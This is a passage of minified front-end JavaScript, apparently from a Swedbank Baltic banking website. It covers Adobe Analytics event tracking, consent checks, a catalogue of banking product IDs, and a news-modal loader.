button):not(#nav-search-submit)','input[type="button"]'],change:["select",":checkbox",":radio",'input:not([class^="ui-slider"]):not([id^="searchPhrase"]):not(#nav-search-query)'],slidechange:[".slider-container"],mousedown:["input.-button"]},trackPageview:function(event,obj){this.track("virtualpageview",_dl),_dl.flow&&_dl.flow.event&&_dl.flow.event.customerFeedbackShown&&(_dl.flow.event.customerFeedbackShown="")},track:function(event,obj){if("undefined"!=typeof s){var p=JSON.parse(Swedbank.sessionStorage.get("p"));p&&p.isRefreshNeeded&&!p.waitForPageload?setTimeout((()=>this.trackTrigger(event,obj)),250):this.trackTrigger(event,obj)}},trackTrigger:function(event,obj){this.setIds(),this.beforeTracking(event),void 0!==obj?("flownopageview"==event&&this.setFlowTimer(),s.directCall(event,obj)):s.directCall(event),this.afterTracking(event)},afterTracking:function(event){!function triggerSiteSpectEvent(){if(_dl&&_dl.sitespectEvent){if(window.SS&&SS.Require){var eventName=_dl.sitespectEvent;SS.Require((function(){SS.EventTrack.rp(eventName)}))}_dl.sitespectEvent=""}}(),_dl&&_dl.partnerOffer&&_dl.partnerOffer.event&&_dl.partnerOffer.event.offerViewed&&(_dl.partnerOffer.event.offerViewed=""),_dl&&_dl.page&&(_dl.page.messages=[])},beforeTracking:function(event){var offersModal=document.querySelector("#offers-modal")||document.querySelector("#dynamic-content-detailed");_dl&&_dl.partnerOffer&&_dl.partnerOffer.event&&!_dl.partnerOffer.event.offerViewed&&offersModal&&!offersModal.isActive()&&(_dl.partnerOffer={}),this.setMessageLabels(),function setSiteSpectEventName(adobeEvent){var trackedEvents=["virtualpageview","flownopageview","click","internalCampaignClick"];if(!(_dl&&_dl.flow&&_dl.flow.name&&_dl.flow.step&&_dl.flow.type&&trackedEvents.includes(adobeEvent)))return;var trackedGroups=["introduction-visual","offer-visual","calculator","regular-table","comparison-table","tabs"],trackedTargets=["button","slider","tab"],trackedSteps=["step0","start","step2","step3","step4","step5","complete"],trackedFlowTypes=["application","lead","service","transfer","transaction","support"],name=_dl.flow.name,step=_dl.flow.step.split(":").shift(),type=_dl.flow.type,eventType=-1!=adobeEvent.indexOf("view")?"pageview":"click",c=_dl.click;if(trackedFlowTypes.includes(type)&&trackedSteps.includes(step))if("pageview"===eventType)_dl.sitespectEvent=name+":"+step+":"+eventType;else if("click"===eventType&&c&&c.group&&"step0"===step){var group=c.group.replace(":internal-campaign","").split(":").pop();if(c.type&&trackedTargets.includes(c.type)&&trackedGroups.includes(group)){group=-1!==group.indexOf("table")?"table":group;var target=c.type;"button"===c.type?target="cta":"tab"===c.type&&(target=c.status),_dl.sitespectEvent=name+":"+step+":"+eventType+":"+group+"-"+target}}}(event)},loginErrorHelper:function(msgInEnglish){loginFlow.formErrors=[],loginFlow.formErrors.push(msgInEnglish),this.track("loginError",{account:_dl.account,page:_dl.page,flow:loginFlow})},getAuthMethodHelper:function(method){switch(method){case 0:return"logged-out";case 1:return"id-card";case 2:return"pin-calculator";case 3:return"password-card";case 5:return"mobile-id";case 9:return"smart-id";default:return"unknown"}},resolveFrontEndLoginMethod:function(){switch(Swedbank.UICookies.readCookie("hanzaLoginTab")||LoginTypes.SMART_ID){case LoginTypes.CERTIFICATE:return"id-card";case LoginTypes.PIN_CALCULATOR:return"pin-calculator";case LoginTypes.MOBILE_ID:return"mobile-id";case LoginTypes.SMART_ID:return"smart-id";default:return"logged-out"}},getBannerIds:function(){return jQuery(this.BANNERS_CSS_CLASSES).map((function(){return this.id})).toArray()},bannerActuallySeen:function(){var context=this;jQuery(this.BANNERS_CSS_CLASSES).each((function(){var $elem=jQuery(this),$loginBar=jQuery("#loginbar");if(jQuery(this).isInViewport()){if(1==$loginBar.css("opacity")&&"desktop"!=Swedbank.Helpers.getMediumPlatform())return!1;-1==_dl.marketing.internalCampaignSeen.indexOf($elem.attr("id"))&&(_dl.marketing.internalCampaignSeen.push($elem.attr("id")),_dl.marketing.internalCampaignViewed.push($elem.attr("id")),context.track("internalCampaignView",_dl),_dl.marketing.internalCampaignViewed=[])}}))},getURLParamByName:function(name){name=name.replace(/[\[\]]/g,"\\$;");var result=new RegExp(name+"(=([^&#]*)|&|#|$)").exec(window.location.href);return result&&result[2]?decodeURIComponent(result[2].replace(/\+/g," ")):""},campaignReferral:function(bannerId){var result=null;return null!=bannerId?Swedbank.localStorage.set("mcrvalue",bannerId):(result=Swedbank.localStorage.get("mcrvalue"),Swedbank.localStorage.erase("mcrvalue")),result},getMobileAppPassedVisitorExists:function(){try{return this.getURLParamByName("adobe_mc")?(Swedbank.sessionStorage.set("amc",1),!0):!!Swedbank.sessionStorage.get("amc")}catch(e){}},getMessageLabels:function(selector,messageType){const phoneNumberRegExp=new RegExp("\\+?\\(?\\d*\\)? ?\\(?\\d+\\)?\\d*([\\s./-]?\\d{2,})+","g");let str,labels=[];return $(selector).each((function(){if($(this).is(":visible")){let instr=$(this).text().replace(/\s+/g," ").replace(phoneNumberRegExp,"(removed)");str=instr.substring(0,120),instr.length>120&&(str=str.substring(0,str.lastIndexOf(" "))+"...[cut]"),str.length&&labels.push(messageType+":"+str)}})),labels},setMessageLabels:function(){if(_dl&&_dl.page){var errorLabels=Swedbank.AdobeTracking.getMessageLabels('.errorMsg, ui-message[type="error"]',"error"),warningLabels=Swedbank.AdobeTracking.getMessageLabels('.warningMsg, ui-message[type="warning"]',"warning"),infoLabels=Swedbank.AdobeTracking.getMessageLabels('.infoMsg, ui-message[type="info"]',"info"),urgentLabels=Swedbank.AdobeTracking.getMessageLabels('.urgentMsg, ui-message[type="urgent"]',"urgent"),validationLabels=Swedbank.AdobeTracking.getMessageLabels('.validation-message, ui-hint[type="error"]',"validation");_dl.page.messages=errorLabels.concat(warningLabels,infoLabels,urgentLabels,validationLabels)}},sendScrollTracking:function(percentage){this.track("scroll",{account:_dl.account,page:_dl.page,flow:_dl.flow,scroll:{scrollPercentage:percentage,event:{scroll:"1"}}})},collectCustomerFeedback:function(){var feedbackContainers=$("#mainForm ui-feedback");if(feedbackContainers&&_dl&&_dl.flow)if(1==feedbackContainers.length){var container=$(feedbackContainers[0]);Swedbank.AdobeTracking.sendFeedbackShown(container,!0)}else $.each(feedbackContainers,(function(i){Swedbank.AdobeTracking.sendFeedbackShown($(feedbackContainers[i]),!1)}))},sendFeedbackShown:function($container,includeWithPageview){if(_dl&&_dl.flow){var dataObj=includeWithPageview?_dl:JSON.parse(JSON.stringify(_dl));dataObj.flow.customerFeedbackCategory=_dl.flow.category?"flow:"+_dl.flow.category:"content",dataObj.flow.customerFeedbackName=$container.attr("id")||"",includeWithPageview?(dataObj.flow.event||(dataObj.flow.event={}),dataObj.flow.event.customerFeedbackShown="1"):(dataObj.flow.event={customerFeedbackShown:"1"},Swedbank.AdobeTracking.track("customerFeedbackShown",dataObj)),$container.on("confirm",(function(e){!function sendFeedbackConfirmed(dataObj,rating,comment){if(dataObj&&dataObj.flow){var sendObj=JSON.parse(JSON.stringify(dataObj));sendObj.flow.customerFeedbackRating=rating,sendObj.flow.event={customerFeedbackRatingTotal:rating,customerFeedbackComplete:"1",customerFeedbackWritten:comment&&comment.split("").length>9?"1":""},Swedbank.AdobeTracking.track("customerFeedbackComplete",sendObj)}}(dataObj,e.detail.rating,e.detail.text)}))}},getDocumentHeight:function(){var D=document;return Math.max(D.body.scrollHeight,D.documentElement.scrollHeight,D.body.offsetHeight,D.documentElement.offsetHeight,D.body.clientHeight,D.documentElement.clientHeight)},distanceScrolled:function(){var D=document,docheight=this.getDocumentHeight(),winheight=window.innerHeight||(D.documentElement||D.body).clientHeight,scrollTop=window.pageYOffset||(D.documentElement||D.body.parentNode||D.body).scrollTop,trackLength=docheight-winheight,pctScrolled=Math.floor(scrollTop/trackLength*100);!this.SCROLL_DISTANCES.sc35&&pctScrolled>=35&&pctScrolled<70&&(this.SCROLL_DISTANCES.sc35=!0,this.sendScrollTracking("35")),!this.SCROLL_DISTANCES.sc70&&pctScrolled>=70&&(this.SCROLL_DISTANCES.sc70=!0,this.sendScrollTracking("70"))},getTimeInSeconds:function(){return Math.ceil((new Date).getTime()/1e3)},setNewFlowTimerData:function(){var now=this.getTimeInSeconds(),timerData={flowName:_dl.flow.name,startStep:_dl.flow.step,startTime:now,currentStep:_dl.flow.step,currentStepTime:now};_dl.flow.timer={duration:timerData.startStep+":0",startStep:timerData.startStep,stepDuration:0},Swedbank.sessionStorage.set("flowTimer",JSON.stringify(timerData))},setFlowTimer:function(){var timer=Swedbank.sessionStorage.get("flowTimer");if(timer&&void 0===_dl.flow.name)Swedbank.sessionStorage.erase("flowTimer");else if(!timer&&_dl.flow&&_dl.flow.name)this.setNewFlowTimerData();else if(timer&&_dl.flow&&_dl.flow.name){var timerData=JSON.parse(timer),now=this.getTimeInSeconds();timerData.flowName==_dl.flow.name&&timerData.currentStep!=_dl.flow.step?(_dl.flow.timer={duration:timerData.startStep+":"+(now-timerData.startTime),startStep:timerData.startStep,stepDuration:now-timerData.currentStepTime},"complete"!=_dl.flow.step?(timerData.currentStep=_dl.flow.step,timerData.currentStepTime=now,Swedbank.sessionStorage.set("flowTimer",JSON.stringify(timerData))):Swedbank.sessionStorage.erase("flowTimer")):timerData.flowName!=_dl.flow.name&&this.setNewFlowTimerData()}},chatFlowTracking:function(chatName,eventDescription){switch(chatFlow={name:chatName,category:"web",type:"support",behaviourType:"selfservice",step:"",stepDescription:"",supportReason:"",supportStatus:"",supportId:"",productArray:[],formErrors:[]},eventDescription){case"proactiveChatShow":chatFlow.step="step0",chatFlow.stepDescription="proactive-chat-show",chatFlow.event={formView:"1"},Swedbank.AdobeTrackingHelpers.setProactiveChat();break;case"virtualAssistantStart":chatFlow.step="start",chatFlow.supportReason="support-green",chatFlow.supportStatus="contacted-VA",chatFlow.event={behaviourStart:"1",formView:"1"};break;case"chatStart":chatFlow.step="start",chatFlow.stepDescription=Swedbank.AdobeTrackingHelpers.chatType+"-start",chatFlow.supportStatus="support-green",chatFlow.supportReason="contacted-agent",chatFlow.supportId=Swedbank.AdobeTrackingHelpers.chatId,chatFlow.event={behaviourStart:"1",formView:"1"};break;case"chatComplete":chatFlow.step="complete",chatFlow.stepDescription=Swedbank.AdobeTrackingHelpers.chatType+"-complete",chatFlow.supportStatus="support-green",chatFlow.supportReason="contacted-agent",chatFlow.supportId=Swedbank.AdobeTrackingHelpers.chatId,chatFlow.event={behaviourComplete:"1",behaviourGreen:"1",formView:"1"};break;case"liveChatUserComplete":chatFlow.supportStatus="support-green",chatFlow.supportReason="contacted-agent-ended-by-user",chatFlow.stepDescription=Swedbank.AdobeTrackingHelpers.chatType+"-complete",chatFlow.step="complete",chatFlow.event={behaviourGreen:"1",behaviourComplete:"1",formView:"1"}}Swedbank.AdobeTracking.track("flownopageview",{account:_dl.account,page:_dl.page,flow:chatFlow})},getTrackableElements:function(eventType){return this.TRACKABLE_ELEMENTS.hasOwnProperty(eventType)?this.TRACKABLE_ELEMENTS[eventType].join(","):""},getStringLargeNumbersMasked:function(str,limit,doReplace){if(doReplace&&"function"==typeof doReplace&&!doReplace())return str;var regex=new RegExp("[0-9]{"+(limit||5)+",}","g");return str.replace(regex,(function($0){return Array($0.length+1).join("n")}))},getEnglishPageTitle:function(){return $("body").data("wtPageTitle")},getVersionNum:function(){return 216+Math.floor(Swedbank.Time.now.diff(moment([2022,6,28]),"days")/14)},setIdRefreshNeeded:function(){var p=JSON.parse(Swedbank.sessionStorage.get("p"));p&&Swedbank.isAuthenticated&&(p.isRefreshNeeded=!0,p.waitForPageload=!0,Swedbank.sessionStorage.set("p",JSON.stringify(p)))},setIds:function(){var p=JSON.parse(Swedbank.sessionStorage.get("p"));p&&Swedbank.isAuthenticated?(_dl.page.userId=p.userId,!p.isRefreshNeeded&&Swedbank.Navigation.isBusiness()&&(_dl.page.businessId=p.businessId)):p&&!Swedbank.isAuthenticated&&Swedbank.sessionStorage.erase("p")},setPartnerOfferData:function($element){$element&&_dl&&(_dl.partnerOffer={offer:$element.attr("data-preview")||$element.find("article p").text()||"",offerCategory:$element.attr("data-category")||"",partnerName:$element.attr("data-offer")||$element.find("article h3").text()||"",group:$element.attr("data-group")||"",event:{offerViewed:"1"}})},setClickTrackingListeners:function(){$.each(this.TRACKABLE_ELEMENTS,(function(eventName,selectors){$(document).untilUnload(eventName,selectors.join(","),trackingHandler)})),$(document).untilUnload("change","ui-slider",SharedComponents.helpers.debounce(trackingHandler,500))},whenAnalyticsScriptsReady:function(callback){const container=document.getElementById("analytics-container"),analyticsExternalScripts=document.querySelectorAll(".aa-external-script"),analyticsInternalScripts=document.querySelectorAll(".aa-internal-script"),analyticsPromises=[].map.call(analyticsExternalScripts,(script=>new Promise(((resolve,reject)=>{script.type="text/javascript",script.src=script.dataset.src,script.async=!1,script.onload=resolve,script.onerror=reject,script.parentElement.replaceChild(script,script)}))));Promise.all(analyticsPromises).then((()=>{[].forEach.call(analyticsInternalScripts,(script=>{const ns=document.createElement("script");ns.innerHTML=script.innerText,ns.async=!1,container.appendChild(ns),script.remove()})),"function"==typeof callback&&callback(),SharedComponents.eventBus.dispatchCustomEvent("analytics-script-loaded")})).catch((err=>Swedbank.error(err)))},trackEverything:function(){Swedbank.isAuthInProgress||(Swedbank.AdobeTracking.collectCustomerFeedback(),Swedbank.AdobeTracking.trackPageview(),Swedbank.AdobeTracking.bannerActuallySeen(),Swedbank.AdobeTracking.setClickTrackingListeners())},isTrackingEnabled:function(){try{return Swedbank.UICookies.getConsentElem().getSelectedCategories().ANALYTICAL===SharedComponents.UICookieConsent.CATEGORY_ALLOWED}catch(e){return!1}}},Swedbank.AdobeTrackingHelpers={chatId:"",setChatId:function(chatId){this.chatId=chatId},chatType:"live-chat",setProactiveChat:function(){this.chatType="proactive-chat"},startChat:function(){Swedbank.AdobeTracking.chatFlowTracking("live-chat","chatStart")},endChat:function(){Swedbank.AdobeTracking.chatFlowTracking("live-chat","chatComplete"),this.reset()},reset:function(){this.chatType="live-chat",this.chatId=""}},jQuery.fn.isInViewport=function(){var elementTop=$(this).offset().top,elementBottom=elementTop+$(this).outerHeight(),viewportTop=$(window).scrollTop(),viewportBottom=viewportTop+$(window).height();return elementBottom>viewportTop&&elementTop<viewportBottom}})),jQuery((function($){(Swedbank=Swedbank||{}).AdobeTracking=Swedbank.AdobeTracking||{},Swedbank.AdobeTracking.Products={PRODUCT_NAMES:{loans:[{category:"loans",name:"small-loan",id:"1000215"},{category:"loans",name:"car-leasing",id:"1000024"},{category:"loans",name:"car-loan",id:"1002832"},{category:"loans",name:"home-loan",id:"1000231"},{category:"loans",name:"home-small-loan",id:"1002843"},{category:"loans",name:"home-equity-loan",id:"1000223"},{category:"loans",name:"credit-line",id:"1002831"},{category:"loans",name:"co-borrower",id:"1309"},{category:"loans",name:"student-loan",id:"1000258"},{category:"loans",name:"student-loan-with-state-guarantee",id:"1002637"},{category:"loans",name:"apartment-building-loan",id:"1000033"},{category:"loans",name:"commercial-vehicles-leasing",id:"1000025"},{category:"loans",name:"industrial-equipment-leasing",id:"1002826"},{category:"loans",name:"wheeled-equipment-leasing",id:"1002825"}],cards:[{category:"debit-cards",cardTypeId:{EE:[2,6],LV:[41,901],LT:[901]},name:"debit-card-plus",id:"1002698"},{category:"debit-cards",cardTypeId:{EE:[5,14],LV:[46,47,902],LT:[110,815,902]},name:"private-banking-card",id:"1000138"},{category:"debit-cards",cardTypeId:{EE:[10,15],LV:[903],LT:[]},name:"isic-mastercard-student-debit-card",id:"1002790"},{category:"debit-cards",cardTypeId:{EE:[],LV:[48,904],LT:[]},name:"isic-mastercard-scholar-debit-card",id:"1002865"},{category:"debit-cards",cardTypeId:{EE:[],LV:[359,380],LT:[]},name:"my-design-card",id:"1000193"},{category:"debit-cards",cardTypeId:{EE:[],LV:[],LT:[111]},name:"debit-maestro-basic-card",id:"1002927"},{category:"debit-cards",cardTypeId:{EE:[9],LV:[],LT:[108]},name:"debit-maestro-senior-card",id:"1002738"},{category:"debit-cards",cardTypeId:{EE:[],LV:[42],LT:[107,903]},name:"debit-mastercard-youth-card",id:"1002741"},{category:"debit-cards",cardTypeId:{EE:[16,105],LV:[4,23],LT:[1,4,6,105]},name:"debit-maestro-card",id:"1000260"},{category:"debit-cards",cardTypeId:{EE:[1],LV:[5],LT:[11]},name:"atm-card",id:"1000254"},{category:"debit-cards",cardTypeId:{EE:[7],LV:[],LT:[55]},name:"debit-maestro-youth-card",id:"1002564"},{category:"debit-cards",cardTypeId:{EE:[],LV:[3],LT:[59]},name:"debit-visa-electron-junior-card",id:"1002568"},{category:"debit-cards",cardTypeId:{EE:[4,8],LV:[908],LT:[908]},name:"mastercard-business-debit-card",id:"1000155"},{category:"credit-cards",cardTypeId:{EE:[53,59],LV:[811,907],LT:[818,907]},name:"revolving-gold-mc",id:"1000240"},{category:"credit-cards",cardTypeId:{EE:[57,58],LV:[813,906],LT:[817,906]},name:"revolving-standard-mc",id:"1000239"},{category:"credit-cards",cardTypeId:{EE:[54,56],LV:[722,905],LT:[820,905]},name:"fixed-payment",id:"1000238"},{category:"credit-cards",cardTypeId:{EE:[96],LV:[913],LT:[816,914]},name:"mastercard-platinum-revolving-card",id:"1000156"},{category:"credit-cards",cardTypeId:{EE:[],LV:[],LT:[817,906]},name:"revolving-silver-mc",id:"1000219"},{category:"credit-cards",cardTypeId:{EE:[37],LV:[],LT:[37]},name:"visa-gold-charge-card",id:"1000124"},{category:"credit-cards",cardTypeId:{EE:[38],LV:[],LT:[38]},name:"visa-platinum-charge-card",id:"1000125"},{category:"credit-cards",cardTypeId:{EE:[92,93],LV:[805,910],LT:[802,823,910]},name:"revolving-platinum-visa",id:"1000218"},{category:"credit-cards",cardTypeId:{EE:[815],LV:[],LT:[815]},name:"visa-vip-private-banking-revolving-card",id:"1002829"},{category:"credit-cards",cardTypeId:{EE:[806],LV:[302,801],LT:[203,213,806,913]},name:"revolving-gold-visa",id:"1000213"},{category:"credit-cards",cardTypeId:{EE:[62,65],LV:[],LT:[65,201,212,801]},name:"visa-standard-revolving-card",id:"1000173"},{category:"credit-cards",cardTypeId:{EE:[39,91,95],LV:[815,912],LT:[39,217,811,822,912]},name:"revolving-visa-business-gold-card",id:"1002859"},{category:"credit-cards",cardTypeId:{EE:[90,94],LV:[814,911],LT:[814,821,911]},name:"revolving-visa-business-card",id:"1002860"},{category:"credit-cards",cardTypeId:{EE:[97],LV:[914],LT:[915]},name:"revolving-mastercard-business-card",id:"1000217"},{category:"credit-cards",cardTypeId:{EE:[98],LV:[915],LT:[916]},name:"revolving-mastercard-business-gold-card",id:"1002838"},{category:"credit-cards",cardTypeId:{EE:[],LV:[],LT:[9]},name:"priority-pass",id:""}],insurances:[{category:"insurances",name:"credit-life",id:"1000234"},{category:"insurances",name:"life-insurance-plus",id:"1002587"},{category:"insurances",name:"traffic-insurance",id:"1000375"},{category:"insurances",name:"casco-insurance",id:"1000374"},{category:"insurances",name:"home-insurance",id:"1000371"},{category:"insurances",name:"home-cover",id:"1002614"},{category:"insurances",name:"klm-home",id:"1002612"},{category:"insurances",name:"compulsory-home",id:"1002613"},{category:"insurances",name:"apartment-building-insurance",id:"1000370"},{category:"insurances",name:"credit-cover",id:"1000369"},{category:"insurances",name:"loan-payment-protection",id:"1002783"},{category:"insurances",name:"travel-insurance",id:"1002647"},{category:"insurances",name:"life-insurance",id:"1002592"}],savings:[{category:"deposits",name:"current-account",id:"1000241"},{category:"deposits",name:"term-deposit",id:"1000176"},{category:"deposits",name:"savings-deposit",id:"1000192"},{category:"deposits",name:"easy-saver",id:"1002985"},{category:"deposits",name:"overnight-deposit",id:"1000002"},{category:"savings-child",name:"college-fund",id:"1002665"},{category:"savings-p2p",name:"pension-index-p2p",id:"1003021",isin:"EE3600001814"},{category:"savings-p2p",name:"pension-conservative",id:"1000157"},{category:"savings-p2p",name:"pension-k1960-1969",id:"1000158"},{category:"savings-p2p",name:"pension-k1970-1979",id:"1000159"},{category:"savings-p2p",name:"pension-k1980-1989",id:"1002636"},{category:"savings-p2p",name:"pension-k1990-1999",id:"1002903"},{category:"savings-p2p",name:"pension-k2000-2009",id:"1003037",isin:"EE3600001848"},{category:"savings-p2p",name:"non-swedbank-p2p-fund ",id:"1002640"},{category:"savings-p2p",name:"pension-investment-account",id:"1003017"},{category:"savings-p2p",name:"pension-2003-2009",id:"1003008"},{category:"savings-p2p",name:"pension-1996-2002",id:"1002954"},{category:"savings-p2p",name:"pension-1989-1995",id:"1002955"},{category:"savings-p2p",name:"pension-1982-1988",id:"1002956"},{category:"savings-p2p",name:"pension-1975-1981",id:"1002957"},{category:"savings-p2p",name:"pension-1968-1974",id:"1002958"},{category:"savings-p2p",name:"pension-1961-1967",id:"1002959"},{category:"savings-p2p",name:"pension-1954-1960",id:"1002971"},{category:"savings-p2p",name:"pension-preservation-fund",id:"1002972"},{category:"savings-p2p",name:"hansapensdin",id:"1000114"},{category:"savings-p2p",name:"hansapenssta",id:"1000115"},{category:"savings-p2p",name:"investment-p2p-1970",id:"1002974"},{category:"savings-p2p",name:"investment-p2p-1980",id:"1002975"},{category:"savings-p2p",name:"investment-p2p-1990",id:"1002966"},{category:"savings-p2p",name:"dynamic-index",id:"1003023"},{category:"savings-p3p",name:"pension-v30",id:"1000353",isin:"EE3600007530",fundId:"SWEDPENSV1",internalId:"ee-p3p-1"},{category:"savings-p3p",name:"pension-v60",id:"1000354",isin:"EE3600071031",fundId:"SWEDPENSV2",internalId:"ee-p3p-2"},{category:"savings-p3p",name:"pension-v100",id:"1000355",isin:"EE3600071049",fundId:"SWEDPENSV3",internalId:"ee-p3p-3"},{category:"savings-p3p",name:"pension-v100-index",id:"1002970",isin:"EE3600109484",fundId:"SWEDPENSV100",internalId:"ee-p3p-4"},{category:"savings-p3p",name:"pension-v60-index",id:"1003012",isin:"EE3600001731",fundId:"SWEDPV60I",internalId:"ee-p3p-6"},{category:"savings-p3p",name:"pension-v30-index",id:"1003013",isin:"EE3600001749",fundId:"SWEDPV30I",internalId:"ee-p3p-7"},{category:"savings-p3p",name:"pension-index-p3p",id:"1003022",isin:"EE3600001822",fundId:"SWED3INDEX",internalId:"ee-p3p-index"},{category:"savings-p3p",name:"pension-hansapensstab+",id:"1000359",fundId:"SWPENSSTAB+"},{category:"savings-p3p",name:"pension-hansapensdinus+",id:"1000358",fundId:"HANSAPENSDINUS+"},{category:"savings-p3p",name:"pension-hansapensdineu+",id:"1000357",fundId:"HANSAPENSDINEU+"},{category:"savings-p3p",name:"pension-hansapensdin100",id:"1000356",fundId:"SWPENSDIN100"},{category:"savings-p3p",name:"pension-hansapensdinindex",id:"1003024"},{category:"savings-p3p",name:"non-swedbank-p3p",id:"1002873",internalId:"ee-p3p-5"},{category:"savings-p3p",name:"pension-60-plus",id:"1003031"},{category:"savings-p3p",name:"pension-18-plus",id:"1003028"},{category:"savings-p3p",name:"pension-18-plus-limited",id:"1003028"},{category:"savings-p3p",name:"pension-50-plus",id:"1003029"},{category:"savings-p3p",name:"pension-50-plus-limited",id:"1003029"},{category:"savings-p3p",name:"pension-60-plus",id:"1003030"},{category:"savings-p3p",name:"pension-60-plus-limited",id:"1003030"},{category:"savings-investments",name:"sw-robur-real-estate",id:"1002986",fundId:"SWRFASTC"},{category:"savings-investments",name:"sw-robur-technology",id:"1002987",fundId:"SWRTECC"},{category:"savings-investments",name:"sw-robur-medical",id:"1002988",fundId:"SWRMEDC"},{category:"savings-investments",name:"sw-robur-global-high-dividend",id:"1002989",fundId:"SWRGHDC"},{category:"savings-investments",name:"sw-robur-access-europe",id:"1002990",fundId:"SWRAEUC"},{category:"savings-investments",name:"sw-robur-access-global",id:"1002991",fundId:"SWRAGLC"},{category:"savings-investments",name:"sw-robur-access-sweden",id:"1002992",fundId:"SWRASVC"},{category:"savings-investments",name:"sw-robur-access-usa",id:"1002993",fundId:"SWBRUSAC"},{category:"savings-investments",name:"sw-robur-access-japan",id:"1002994",fundId:"SWBACJPC"},{category:"savings-investments",name:"sw-robur-access-asia",id:"1002995",fundId:"SWBACASC"},{category:"savings-investments",name:"sw-robur-global-impact",id:"1002996",fundId:"SWRGLIMPC"},{category:"savings-investments",name:"sw-robur-access-edge-emerging-markets",id:"1002997",fundId:"SWERAEEC"},{category:"savings-investments",name:"sw-robur-corp-bond-eu",id:"1003018",fundId:"SWRCBEUC"},{category:"savings-investments",name:"sw-robur-corp-bond-eu-high-yield",id:"1003019",fundId:"SWRCBEHYC"},{category:"savings-investments",name:"sw-robur-corp-bond-nordic",id:"1003020",fundId:"SWEDCB1"},{category:"savings-investments",name:"swedbank-fund-funds-30",id:"1002797",fundId:"HANSAFF30E"},{category:"savings-investments",name:"swedbank-fund-funds-60",id:"1002798",fundId:"HANSAFF60E"},{category:"savings-investments",name:"swedbank-fund-funds-100",id:"1002799",fundId:"HANSAFF100E"},{category:"savings-investments",name:"savings-funds-10",id:"1002998",fundId:"SWBSF10"},{category:"savings-investments",name:"savings-funds-30",id:"1002999",fundId:"SWBSF30"},{category:"savings-investments",name:"savings-funds-60",id:"1003000",fundId:"SWBSF60"},{category:"savings-investments",name:"savings-funds-100",id:"1003001",fundId:"SWBSF100"},{category:"savings-investments",name:"swedbank-eastern-europe-eq-fund",id:"1002803",fundId:"HIEAFEUR"},{category:"savings-investments",name:"swedbank-russian-eq-fund",id:"1002800",fundId:"HVAFEUR"},{category:"savings-investments",name:"non-swedbank-fund",id:"1002870",fundId:"non-swedbank-fund"},{category:"savings-investments",name:"investment-account",id:"1004012",fundId:"investment-account"},{category:"savings-investments",name:"securities-account",id:"1000247"},{category:"savings-investments",name:"saving-notes",id:"1002863"}],serviceplans:[{category:"service-plans",name:"payments-plan",id:"1002979"},{category:"service-plans",name:"service-plan-convenient",id:"1002904"},{category:"service-plans",name:"service-plan-convenient-plus",id:"1002905"},{category:"service-plans",name:"service-plan-convenient-gold",id:"1002906"},{category:"service-plans",name:"service-plan-convenient-plus-gold",id:"1002907"},{category:"service-plans",name:"service-plan-convenient-youth-one-two-three",id:"1002908"},{category:"service-plans",name:"service-plan-convenient-youth-four",id:"1002909"},{category:"service-plans",name:"service-plan-convenient-senior",id:"1002910"},{category:"service-plans",name:"service-plan-convenient-plus-private-banking",id:"1002911"},{category:"service-plans",name:"service-plan-convenient-private-banking",id:"1002912"},{category:"service-plans",name:"service-plan-convenient-salary-receivers",id:"1002913"},{category:"service-plans",name:"service-plan-convenient-plus-salary-receivers",id:"1002914"},{category:"service-plans",name:"service-plan-convenient-sw-employees",id:"1002915"},{category:"service-plans",name:"service-plan-basic",id:"1002916"},{category:"service-plans",name:"service-plan-business-10",id:"1002922"},{category:"service-plans",name:"service-plan-business-20",id:"1002923"},{category:"service-plans",name:"service-plan-business-50",id:"1002924"},{category:"service-plans",name:"service-plan-business-100",id:"1002925"},{category:"service-plans",name:"service-plan-business-plus",id:"1002926"},{category:"service-plans",name:"service-plan-farmer-bundle",id:"1002933"},{category:"service-plans",name:"service-plan",id:"1002921"}],ecommerce:[{category:"POS",name:"e-commerce-payments-platform",id:"1003006"},{category:"e-channels",name:"bank-link-services",id:"1000005"},{category:"POS",name:"online-card-acquiring",id:"1002552"},{category:"POS",name:"swedbank-payment-portal",id:"1002840"},{category:"POS",name:"e-commerce-payment-cards-servicing",id:"1002552"}]},getProductParameterByKeyValue:function(parameter,key,value,optionalCategory){if(this.PRODUCT_NAMES.hasOwnProperty(optionalCategory)){if(""!==(name=getListProductParameterByKeyValue(parameter,key,value,optionalCategory)))return name}else for(var categories=Object.keys(this.PRODUCT_NAMES),i=0;i<categories.length;i++){var name;if(""!==(name=getListProductParameterByKeyValue(parameter,key,value,categories[i])))return name}return"unknown"},getProductNameByKeyValue:function(key,value,optionalCategory){return this.getProductParameterByKeyValue("name",key,value,optionalCategory)},getProductIdByKeyValue:function(key,value,optionalCategory){return this.getProductParameterByKeyValue("id",key,value,optionalCategory)},getProductCategoryByKeyValue:function(key,value,optionalCategory){return this.getProductParameterByKeyValue("category",key,value,optionalCategory)}};var getListProductParameterByKeyValue=function(parameter,key,value,category){for(var products=Swedbank.AdobeTracking.Products.PRODUCT_NAMES[category],i=0;i<products.length;i++){var product=products[i];if(product.hasOwnProperty(key))if(Array.isArray(product[key][Swedbank.country])){for(var j=0;j<product[key][Swedbank.country].length;j++)if(product[key][Swedbank.country][j]==value)return product[parameter]||parameter+"-not-set"}else if(product[key]==value)return product[parameter]||parameter+"-not-set"}return""}})),Swedbank.News=class{load(id){return Swedbank.UIModals.loadContent({pageId:"controls",securityId:document.mainForm.securityId.value,encoding:document.mainForm.encoding.value,language:document.mainForm.language.value,controlId:"news.NewsDetailsControl",layout:"details",newsId:id}),this}extractNewsIdFromURL(url){return encodeURI(url.split("#news=")[1])}static loadCallback(){if(!document.mainForm)return;const news=new Swedbank.News;let params={pageId:"controls",securityId:document.mainForm.securityId.value,encoding:document.mainForm.encoding.value,language:document.mainForm.language.value,controlId:"news.NewsDetailsControl",layout:"details"};[].forEach.call(document.querySelectorAll('a[href^="#news="]'),(function(atag){atag.addEventListener("click",(function(event){event.preventDefault();const newsId=news.extractNewsIdFromURL(atag.getAttribute("href"));params=Object.assign({},params,{newsId:newsId}),Swedbank.UIModals.loadContent(params)}))}));const newsId=news.extractNewsIdFromURL(window.location.href);newsId&&"undefined"!==newsId&&news.load(newsId)}},Swedbank.isUiSpaEnabled?(SharedComponents.eventBus.addEventListener("spa-navigation-complete",Swedbank.News.loadCallback),UI.whenDOMReady(Swedbank.News.loadCallback)):Swedbank.PageLoad.onEach(Swedbank.News.loadCallback),Swedbank.Blinker=function(){var notificationInterval=null,queue=[],originalTitle=null;var removeBlink=function(blinkId){queue=queue.filter((function(blink){return 